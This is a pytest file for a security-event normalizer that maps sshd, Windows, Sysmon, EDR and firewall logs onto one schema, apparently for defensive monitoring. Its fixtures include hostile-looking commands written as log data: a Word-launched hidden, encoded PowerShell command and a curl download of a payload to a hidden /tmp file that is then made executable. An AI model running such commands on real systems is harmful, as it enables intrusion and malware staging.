import copy
import json
from pathlib import Path

import pytest

from src.normalizer import (
    AUTHENTICATION,
    DNS_QUERY,
    EVENT_TYPES,
    FILE_CREATE,
    FILE_MODIFICATION,
    NETWORK_CONNECTION,
    PROCESS_CREATE,
    UnsupportedEventError,
    normalize_event,
    normalize_events,
)

DATA_FILE = Path(__file__).resolve().parent.parent / "data" / "security_events.json"


# --- Sample raw events (one per vendor format) ------------------------------

SSHD_FAILURE = {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:03+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "event": "auth_failure",
    "user": "admin",
    "src_ip": "203.0.113.45",
    "src_port": 51122,
    "message": "Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2",
}

WINDOWS_LOGON = {
    "log_source": "windows_security",
    "EventID": 4624,
    "TimeCreated": "2026-09-14T08:58:12Z",
    "Computer": "FIN-WS-07.corp.example.com",
    "TargetUserName": "mgarcia",
    "TargetDomainName": "CORP",
    "LogonType": "2",
    "IpAddress": "-",
}

SYSMON_PROCESS = {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 09:32:05.417",
    "Computer": "FIN-WS-07.corp.example.com",
    "User": "CORP\\mgarcia",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoP -W Hidden -Enc SQBEAA==",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
}

LINUX_PROCESS = {
    "log_source": "linux_edr",
    "event_time": 1789378990000,  # 2026-09-14T09:43:10Z
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/curl",
    "cmdline": "curl -fsSL http://198.51.100.77/k -o /tmp/.cache-update",
    "parent_exe_path": "/usr/bin/bash",
}

SYSMON_NETWORK = {
    "log_source": "sysmon",
    "EventID": 3,
    "UtcTime": "2026-09-14 09:32:06.260",
    "Computer": "FIN-WS-07.corp.example.com",
    "User": "CORP\\mgarcia",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "10.0.2.37",
    "DestinationIp": "192.0.2.80",
    "DestinationPort": "80",
}

FIREWALL_CONNECTION = {
    "log_source": "network_firewall",
    "time": "2026-09-14 09:43:10",
    "source_address": "10.0.1.15",
    "destination_address": "198.51.100.77",
    "destination_port": 80,
    "action": "allow",
}

SYSMON_DNS = {
    "log_source": "sysmon",
    "EventID": 22,
    "UtcTime": "2026-09-14 08:31:40.502",
    "Computer": "DEV-PC-03.corp.example.com",
    "User": "CORP\\roberto",
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "QueryName": "github.com",
    "QueryResults": "::ffff:140.82.121.4;",
}

SYSMON_FILE_CREATE = {
    "log_source": "sysmon",
    "EventID": 11,
    "UtcTime": "2026-09-14 09:32:08.911",
    "Computer": "FIN-WS-07.corp.example.com",
    "User": "CORP\\mgarcia",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TargetFilename": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\OneDriveSync.exe",
}

LINUX_CHMOD = {
    "log_source": "linux_edr",
    "event_time": 1789378999500,  # 2026-09-14T09:43:19.500Z
    "hostname": "web-prod-01",
    "event_category": "file_chmod",
    "username": "deploy",
    "exe_path": "/usr/bin/chmod",
    "cmdline": None,
    "target_path": "/tmp/.cache-update",
    "file_mode": "0755",
}


# --- Per event type ---------------------------------------------------------


def test_authentication_normalization():
    event = normalize_event(SSHD_FAILURE)

    assert event.event_type == AUTHENTICATION
    assert event.timestamp == "2026-09-14T09:41:03.000Z"
    assert event.user == "admin"
    assert event.host == "web-prod-01"
    assert event.source_ip == "203.0.113.45"
    assert event.result == "FAILURE"
    # The connecting IP initiates the logon; the account and host are acted upon.
    assert event.principal == {"ip": "203.0.113.45"}
    assert event.target == {"user": "admin", "host": "web-prod-01"}


def test_process_creation_normalization():
    event = normalize_event(SYSMON_PROCESS)

    assert event.event_type == PROCESS_CREATE
    assert event.timestamp == "2026-09-14T09:32:05.417Z"
    assert event.user == "mgarcia"  # domain prefix stripped
    assert event.host == "FIN-WS-07"  # FQDN shortened
    assert event.process.endswith("powershell.exe")
    assert event.parent_process.endswith("WINWORD.EXE")
    assert "-Enc" in event.command_line
    # Parent process is the principal, the new process is the target.
    assert event.principal["process"] == event.parent_process
    assert event.target["process"] == event.process


def test_network_connection_normalization():
    event = normalize_event(SYSMON_NETWORK)

    assert event.event_type == NETWORK_CONNECTION
    assert event.source_ip == "10.0.2.37"
    assert event.destination_ip == "192.0.2.80"
    assert event.destination_port == 80  # string "80" converted to int
    assert event.target == {"ip": "192.0.2.80", "port": 80}


def test_dns_query_normalization():
    event = normalize_event(SYSMON_DNS)

    assert event.event_type == DNS_QUERY
    assert event.dns_query == "github.com"
    assert event.host == "DEV-PC-03"
    assert event.target == {"hostname": "github.com"}


def test_file_create_normalization():
    event = normalize_event(SYSMON_FILE_CREATE)

    assert event.event_type == FILE_CREATE
    assert event.file_path.endswith("\\Temp\\OneDriveSync.exe")
    assert event.process.endswith("powershell.exe")
    assert event.target == {"file_path": event.file_path}


def test_file_modification_normalization():
    event = normalize_event(LINUX_CHMOD)

    assert event.event_type == FILE_MODIFICATION
    assert event.timestamp == "2026-09-14T09:43:19.500Z"  # epoch ms -> ISO 8601
    assert event.file_path == "/tmp/.cache-update"
    assert event.process == "/usr/bin/chmod"


# --- Raw event preservation -------------------------------------------------


@pytest.mark.parametrize(
    "raw",
    [SSHD_FAILURE, WINDOWS_LOGON, SYSMON_PROCESS, LINUX_PROCESS, FIREWALL_CONNECTION, LINUX_CHMOD],
)
def test_raw_event_is_preserved_unchanged(raw):
    original = copy.deepcopy(raw)
    event = normalize_event(raw)

    assert event.raw_event == original
    assert raw == original  # input not mutated
    assert event.raw_event is not raw  # independent copy


def test_vendor_specific_fields_survive_in_raw_event():
    event = normalize_event(SSHD_FAILURE)

    # "message" is not part of the normalized schema but must stay available.
    assert event.raw_event["message"].startswith("Failed password for invalid user admin")
    assert event.to_dict()["raw_event"]["src_port"] == 51122


# --- Optional / missing fields ----------------------------------------------


def test_windows_placeholder_ip_becomes_none():
    event = normalize_event(WINDOWS_LOGON)

    assert event.source_ip is None  # "-" means "no value" in Windows logs
    assert event.principal == {}  # no empty values in entities
    assert event.target == {"user": "mgarcia", "host": "FIN-WS-07"}


def test_missing_optional_fields_do_not_crash():
    minimal = {
        "log_source": "sysmon",
        "EventID": 3,
        "UtcTime": "2026-09-14 10:00:00.000",
        "DestinationIp": "192.0.2.10",
    }
    event = normalize_event(minimal)

    assert event.event_type == NETWORK_CONNECTION
    assert event.destination_ip == "192.0.2.10"
    assert event.user is None
    assert event.host is None
    assert event.destination_port is None
    assert event.principal == {}


def test_invalid_port_value_becomes_none():
    raw = {**FIREWALL_CONNECTION, "destination_port": "n/a"}
    assert normalize_event(raw).destination_port is None


def test_unknown_log_source_is_rejected():
    with pytest.raises(UnsupportedEventError):
        normalize_event({"log_source": "mystery_vendor"})


def test_unsupported_event_code_is_rejected():
    with pytest.raises(UnsupportedEventError):
        normalize_event({**SYSMON_PROCESS, "EventID": 255})


def test_bad_events_are_reported_not_dropped():
    no_timestamp = {k: v for k, v in SSHD_FAILURE.items() if k != "timestamp"}
    events, rejected = normalize_events([SSHD_FAILURE, {"log_source": "unknown"}, no_timestamp])

    assert len(events) == 1
    assert len(rejected) == 2
    assert all(reason for _, reason in rejected)


# --- Multiple vendor formats ------------------------------------------------


def test_authentication_from_linux_and_windows_share_one_schema():
    linux = normalize_event(SSHD_FAILURE)
    windows = normalize_event(WINDOWS_LOGON)

    assert linux.event_type == windows.event_type == AUTHENTICATION
    assert {linux.result, windows.result} == {"SUCCESS", "FAILURE"}
    assert linux.vendor != windows.vendor
    assert linux.to_dict().keys() == windows.to_dict().keys()


def test_network_events_from_firewall_and_sysmon_map_to_same_fields():
    firewall = normalize_event(FIREWALL_CONNECTION)  # source_address / destination_address
    sysmon = normalize_event(SYSMON_NETWORK)  # SourceIp / DestinationIp

    for event in (firewall, sysmon):
        assert event.event_type == NETWORK_CONNECTION
        assert event.source_ip is not None
        assert event.destination_ip is not None
        assert isinstance(event.destination_port, int)
    assert firewall.result == "ALLOWED"


def test_process_events_from_linux_and_windows_share_one_schema():
    linux = normalize_event(LINUX_PROCESS)
    windows = normalize_event(SYSMON_PROCESS)

    for event in (linux, windows):
        assert event.event_type == PROCESS_CREATE
        assert event.process and event.parent_process and event.command_line
    assert linux.timestamp == "2026-09-14T09:43:10.000Z"


# --- Bundled dataset ---------------------------------------------------------


def test_bundled_dataset_normalizes_completely_and_in_order():
    raw_events = json.loads(DATA_FILE.read_text(encoding="utf-8"))
    events, rejected = normalize_events(raw_events)

    assert rejected == []
    assert len(events) == len(raw_events)
    assert [e.timestamp for e in events] == sorted(e.timestamp for e in events)
    assert {e.event_type for e in events} == set(EVENT_TYPES)
    assert len({e.event_id for e in events}) == len(events)  # IDs are unique
    assert {e.log_source for e in events} == {
        "linux_sshd",
        "linux_edr",
        "network_firewall",
        "windows_security",
        "sysmon",
    }
